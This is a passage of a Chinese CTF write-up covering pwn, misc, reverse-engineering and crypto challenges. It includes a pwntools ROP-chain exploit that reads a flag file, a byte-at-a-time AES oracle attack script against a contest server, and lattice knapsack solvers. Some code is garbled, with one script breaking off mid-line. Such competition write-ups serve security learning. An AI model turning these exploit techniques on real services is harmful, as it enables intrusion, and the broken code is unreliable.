     context.log_level = 'debug' 
     cn.recv() 
     cn.sendline(payload) 
     a = cn.recv() 
            text_base = u64(a[0x110-1:0x117])-0xbda23 
            print(hex(text_base)) 
    #read rop2 
    # gdb.attach(cn) 
     open_addr = text_base+0xCFEA0 
     read_addr = text_base+0xCFF10 
     write_addr = text_base+0xCFEF0 
     print(hex(open_addr)) 
     print(hex(read_addr)) 
     print(hex(write_addr)) 
     pppr = text_base+0x11a1a2 
     ppppr = text_base+0x11a1a0 
            pop_rdi_ret = text_base+0x37531 
     flag_addr = 0xc000044d78+0x100 
     addr = 0xc000044d78 
     main_got = text_base + 0x1EEF38 
     rop1 = p64(open_addr)+p64(pppr)+p64(addr)+p64(0)+p64(0)+p64(read_addr)+p64(ppppr)+p64(6)+p64(flag_addr)+p64(0x100)+p64(0)+p64(write_addr)+p64(pppr)+p64(1)+p64(flag_addr)+p64(0x200) 
     cn.sendline('./flag\x00\x00'+'d'*0x68+p64(0xc000047d00)+p64(0x40)+'./flag\x00\x00'+'e'*(144-8)+rop1) 
            cn.recvuntil('is :') 
     a = cn.recv() 
     cn.interactive() 
     print(a[:1000]) 
    pwn()
## misc
###  sign-in
快乐签到题
### **XMAN_Happy_birthday!**
倒叙脚本一把梭
    a = open('./daolnwod.zip','rb').read() 
    b = a[::-1] 
    c = open('res.zip','wb') 
    c.write(b) 
    c.close()
解压得flag
### **Performance_artist**
分割成28*28大小的图片，然后找到字符的数据集，转成图片，再用phash和 汉明距离慢慢搞，外加人工比对部分
    from PIL import Image 
    import imagehash 
    import os 
    def hammingDistance(x, y): 
        return bin(x ^ y).count('1') 
    hash_size = 12 
    pathh = '' 
    pathyuan = '' 
    # 提取phash，节约时间 
    if not os.path.exists('E:\\phash.txt'): 
    with open('E:\\phash.txt', 'w+') as file: 
    trains = os.listdir(path) 
    for i in trains: 
    imagepng = Image.open(path+i) 
    file.write(str(imagehash.phash(imagepng, 12)) + '\t' + i + '\n') 
    misc = os.listdir(pathyuan) 
    file = open('E:\\phash.txt') 
    s = file.readlines() 
    hashs = list(map(lambda x: x.split('\t')[0], s)) 
    chars = list(map(lambda x: x.split('_')[2][0], s)) 
    # chars = list(map(lambda x: x.split('\t')[1][0], s)) 
    string = "" 
    sure = [322] 
    for i in sure: 
        image1 = Image.open(pathyuan + str(i) + '.png') 
        temphash = imagehash.phash(image1, hash_size) 
        print(i) 
        """if str(temphash) in hashs: 
            print(i, chars[hashs.index(str(temphash))],s[hashs.index(str(temphash))]) 
            string += chars[hashs.index(str(temphash))]""" 
        for j in hashs: 
            if hammingDistance(int(str(temphash), 16), int(j, 16)) 项目可以得到水印图像
再反色处理以及加上标识符得到
zxing扫描得： W[@rR1or](https://github.com/rR1or "@rR1or")
**part3：**
文件通过crypto解密，密钥为国王说的那句话的去除大写字母倒叙16进制转换，其密钥为：Y0u_[@re_5o_bRaVE](https://github.com/re_5o_bRaVE
"@re_5o_bRaVE")，解密后是一堆空字符，换成0和1后得到
    100110101111011010101110000001000001011010000110011011101010011000000100011001101111011010101110011101100010011000000100100101100010111010000100100001001000010010000100100001001000010001010000 
    01010000 
    01010000 
    01010000 
    000011101000011001001110001011101100110001011100111010100001011001001110010010100100111001001110010011100111111001010000
然后再倒叙二进制转字符串再倒叙得到
    You have found it!!!!!! 
    part3:WhrRrrr~
得到part3： WhrRrrr~  
最后fuzzpart1得到flag
###  FeedBack
问卷题，需要翻墙
### **Music_game**
通过声音控制坦克移动，到终点就有flag
## re
###  easy_re
调试了无数遍之后，突然一次crtl+f7加乱改运行位置的时候偶然看到了一个和flag有关的的函数，从cmp进行调试，终于找到了藏起来的flag（签到真不容易）。
## crypto
###  piece_of_cake
应该是非预期解了，直接解eatcake处的二维ntru，本地测试得到的m略小于cake，大概差了几个g，索性直接发送m+2*g给靶机，随缘。【解二维ntru的脚本先知就有，不贴了】
###  Game
以获取答案的第一组为例：发送两组数据，要求保持密文的第一组数据不变【由于aes的iv会变，每次都发送iv就行，本次的iv是上一次的密文最后一组，初始iv已给】随后发送十五个填充字节。这个时候服务器会返回的第二组密文就是十五个填充字节+sceret第一个字节。
为了获取这个字节我们爆破。发送两组数据，第一组是iv，第二组是十五个填充字节加一个遍历256的i，若密文与之前的第二组相同，那个i就是secret的第一个字节。
    from pwn import * 
    sh=remote("81.68.174.63","16442") 
    from pwnlib.util.iters import mbruteforce 
    from hashlib import sha256 
    def proof_of_work(sh): 
    sh.recvuntil("XXXX+") 
    suffix = sh.recvuntil(')').decode("utf8")[:-1] 
    log.success(suffix) 
    sh.recvuntil("== ") 
    cipher = sh.recvline().strip().decode("utf8") 
    proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() ==  cipher, string.ascii_letters + string.digits, length=4, method='fixed') 
    sh.sendlineafter("Give me XXXX:", proof) 
    #context.log_level = 'debug' 
    proof_of_work(sh) 
    secret=b"" 
    #sitep1 
    ban=sh.recvuntil("IV is: ") 
    tmp_head = sh.recvuntil("\n")[:-1] 
    for j in range(48): 
    sh.recvuntil("> ") 
    sh.sendline("1") 
    sh.recvuntil(": ") 
    sh.sendline(tmp_head + b"00" * (48-len(secret)//2-1)) 
    print("start:") 
    tmp = sh.recvuntil("\n")[:-1] 
    tmp_head = tmp[-32:] 
    goal = tmp[96:128] 
    print(goal) 
    #sh.interactive() 
    for i in range(256): 
    sh.recvuntil("> ") 
    sh.sendline("1") 
    sh.recvuntil(": ") 
    sh.sendline(tmp_head+b"00"*(48-len(secret)//2-1)+secret+ hex(i)[2:].rjust(2,"0").encode("latin1")) 
    tmp = sh.recvuntil("\n")[:-1] 
    tmp_head = tmp[-32:] 
    if tmp[96:128] == goal: 
    print("this send get answer:") 
    print((tmp_head + b"00" * (48 - len(secret) // 2 - 1) + secret + hex(i)[2:].rjust(2, "0").encode("latin1"))) 
    secret+=hex(i)[2:].rjust(2,"0").encode("latin1") 
    print(secret) 
    break 
    # 
    sh.recvuntil("> ") 
    sh.sendline("2") 
    sh.recvuntil(": ") 
    sh.sendline(secret) 
    flag=sh.recv() 
    print(flag) 
    sh.interactive()
###  babysum
120维背包取20个，轻背包，改自soreatu参与密码挑战赛的脚本
    import re 
    import random 
    import logging 
    import multiprocessing as mp 
    from functools import partial 
    logging.basicConfig(level=logging.DEBUG) 
    LEVEL = [ 
        # n    k    s 
        (120,  20,  11204158321431815830823699004382994461036257963) 
    ] 
    ZERO_FORCE = { 
        # n   r 
        120: 20, 
    } 
    def check(sol, A, s): 
        """Check whether *sol* is a solution to the subset-sum problem. 
        """ 
        return sum(x*a for x, a in zip(sol, A)) == s 
    small_vec = None 
    def solve(A, n, k, s, r, ID=None, BS=22): 
        N = ceil(sqrt(n)) # parameter used in the construction of lattice 
        rand = random.Random(x=ID) # seed 
        indexes = set(range(n)) 
        small_vec = None 
        itr = 0 
        total_time = 0.0 
        print(f"[{ID}] n={n} Start... {itr}") 
        while True: 
            # 1. initalization 
            #t0 = cputime() 
            itr += 1 
            kick_out = set(sample(range(n), r)) 
            new_set = [A[i] for i in indexes - kick_out] 
            lat = [] 
            for i,a in enumerate(new_set): 
                lat.append([1*(j==i) for j in range(n-r)] + [N*a] + [N]) 
            lat.append([0]*(n-r) + [N*s] + [k*N]) 
            shuffle(lat, random=rand.random) 
            m = matrix(ZZ, lat) 
            #t_BKZ = cputime() 
            m_BKZ = m.BKZ(block_size=BS) 
            print("BKZ finished") 
            #print(f"[{ID}] n={n} {itr} runs. BKZ running time: {cputime(t_BKZ):.3f}s") 
            if m_BKZ[0].norm()^2 == k: 
                print("+++++++++++++"); 
                print("total time: "+str(total)) 
                print(m_BKZ[0]) 
                print(kick_out) 
                return True 
    def main(): 
        CPU_CORE_NUM = 80 
        for n, k, s in LEVEL[:]: 
            r = ZERO_FORCE[n] 
            A = #key列表 
            solve_n = partial(solve, A, n, k, s, r) 
            with mp.Pool(CPU_CORE_NUM) as pool: 
                reslist = pool.imap_unordered(solve_n, range(CPU_CORE_NUM)) 
                # terminate all processes once one process returns 
                for res in reslist: 
                    if res: 
                        pool.terminate() 
                        break 
    if __name__ == "__main__": 
        main()
80核服务器5分钟【运气好24s】  
8核虚拟机运气好5分钟
###  sum
同上，不过180维背包取160个，反过来看还是轻背包。不过就是80核服务器15h+而已，【草：一种植物】